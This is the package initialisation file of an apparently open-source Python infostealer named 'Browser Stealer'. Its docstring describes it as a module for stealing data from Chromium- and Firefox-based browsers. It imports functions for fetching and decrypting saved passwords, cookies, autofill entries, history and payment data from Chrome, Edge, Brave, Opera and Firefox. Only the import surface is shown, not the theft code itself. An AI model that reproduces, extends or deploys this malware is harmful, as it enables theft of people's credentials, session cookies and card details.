"""
Browser Stealer 
~~~~~~~~~~~~~~~

Module for stealing data from chromium based and firefox (forks) based browsers 

:copyright: (c) 2023 Josakko
:license: MIT, see https://github.com/Josakko/browser_stealer/blob/main/LICENSE for more details
"""

from .browser_stealer import Utils, run, opera_gx, opera, chrome, chrome, chromium, edge, brave,   fetch_autofill, fetch_bookmarks, fetch_cookies, decrypt_fetch_cookies, fetch_history, fetch_downloads, fetch_passwords, fetch_payment
from .firefox import Firefox, FirefoxUtils, FirefoxData, firefox_steal

